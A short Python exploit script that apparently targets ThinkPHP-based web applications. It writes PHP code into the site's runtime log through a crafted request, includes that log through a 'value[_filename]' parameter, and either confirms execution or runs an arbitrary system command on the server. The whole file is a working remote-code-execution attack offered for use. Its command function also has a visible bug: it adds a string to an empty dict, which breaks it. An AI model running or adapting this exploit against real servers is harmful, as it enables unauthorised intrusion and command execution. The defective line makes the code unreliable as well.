import requests
import datetime
import ssl
import urllib.request

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded',
}


def exp_check(url):
    try:
        heads={
            "Content-Type":"application/x-www-form-urlencoded"
        }
        now = datetime.datetime.now()
        data = now.strftime("%y_%m_%d")
        context = ssl._create_unverified_context()
        req = urllib.request.Request(url + "/?m=Home&c=Index&a=index&test=-><?=var_dump('check');?>",headers=heads)
        urllib.request.urlopen(req,context=context)
        rp = requests.get(url+"/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/"+data+".log",headers=heads,verify=False,timeout=10)
        if rp.status_code==200 and 'check' in rp.text:
            return 1
        else:
            return 2
    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3


def exp_cmd(url,cmd):
    try:
        
        now = datetime.datetime.now()
        data = now.strftime("%y_%m_%d")
        context = ssl._create_unverified_context()
        req = urllib.request.Request(url + "/?m=Home&c=Index&a=index&test=--><?=system('"+{}+"');?>".format(cmd),headers=headers)
        urllib.request.urlopen(req,context=context)
        rp = requests.get(url+"/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/"+data+".log",headers=headers,verify=False)
        if rp.text!="":
            return rp.text


    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3